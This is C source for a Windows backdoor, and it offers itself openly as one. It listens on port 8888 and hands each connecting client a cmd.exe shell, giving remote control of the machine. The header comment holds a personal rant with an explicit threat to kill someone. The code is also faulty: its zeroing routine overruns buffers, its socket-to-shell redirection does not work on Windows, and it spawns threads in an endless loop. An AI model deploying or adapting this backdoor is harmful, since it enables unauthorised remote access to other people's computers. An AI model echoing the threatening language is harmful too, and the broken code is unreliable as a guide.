/*
 ****************************************************************
 * A simple backdoor for Windoze...                             *
 **************************************************************************
 *  /////////////////\\\\\\\\\\\\\\\\\\\\              BY                 *
 * //////// My DAD and Step Mom  \\\\\\\\\            P.R.S.              *
 * \\\  .:[P R S T U V W X Y NOSEY]:.  ///   I'm 29 years old, and they   *
 *  \\\\\\\\\\\\\\\\\//////////////////// still wanna' pry (never stops). *
 **************************************************************************
 */

 /* --- I am an American Soldier and spray a drug dealer one night after he
    sprayed me with part agent orange. Now most likely because my dad and
    step mom lied, saying "Nothing was going on.". That night when I called the
    cops. I made him go to the hospital so, he made me. And they think I'm crazy.
    LMFAO.... I would kill that fucker in a heartbeat if he does domestic terrorism
    again. --- */

#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>

#include <windows.h>
#include <winsock2.h>

#define MY_PORT 8888
#define PROGRAM_NAME "C:\\Windows\\system32\\cmd.exe"

#define TERMINATE(A, T, M) ({\
	if((T)) {\
		if(A == 0) fprintf(stderr, "ERROR: %s\n", M);\
		else if(A == 1) fprintf(stderr, "WARNING: %s\n", M);\
		else fprintf(stdout, "%s\n", M);\
		errno = 0;\
		goto error;\
	}\
})

enum _TERMINATE {
	TERMINATE_ERROR,
	TERMINATE_WARNING,
	TERMINATE_NORMAL
};

void
pzero(p, s)
char *p;
size_t s;
{
	size_t i;
	for(i=0; i<s+1; ++i)
		*(p+i)=0;
}

struct _tagPROGRAM {
	int serverfd;
	int clientfd;
} program;

DWORD
backdoor_thread(lpVoid)
LPVOID lpVoid;
{
	struct _tagPROGRAM prog = *(struct _tagPROGRAM*)lpVoid;
	const char *args[] = {"", NULL};
	dup2(prog.clientfd, 0);
	dup2(prog.clientfd, 1);
	execvp(PROGRAM_NAME, args);
	closesocket(prog.clientfd);
	return S_OK;
}

int
main()
{
	WSADATA wsaData;
	int sockfd;
	struct sockaddr_in self;
	HANDLE hThread;

	pzero(&program, sizeof(program));
	WSAStartup(MAKEWORD(2, 0), &wsaData);
	sockfd = 0;
    TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));

	/* Setup socket address struct */
	pzero(&self, sizeof(self));
	self.sin_family = AF_INET;
	self.sin_port = htons(MY_PORT);
	self.sin_addr.s_addr = INADDR_ANY;

	/* bind port to socket */
	TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
	/* listen for connections */
	TERMINATE(TERMINATE_ERROR, listen(sockfd, 20) < 0, strerror(errno));
	program.serverfd = sockfd;

	for(;;) {
		int clientfd;
		struct sockaddr_in client;
		int clientlen = sizeof(client);
		char message[256];

		/* accept connection */
		clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
		if(clientfd > 0) program.clientfd = clientfd;
		pzero(message, sizeof(message));
		sprintf(message, "%s: client connected.\n", inet_ntoa(client.sin_addr));
		puts(message);
		while((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&backdoor_thread, &program, 0, 0)));
	}

	while(WaitForSingleObject(hThread, 0));
	closesocket(sockfd);
	WSACleanup();
    return 0;

error:
	if(sockfd != 0) closesocket(sockfd);
	WSACleanup();
	return 1;
}
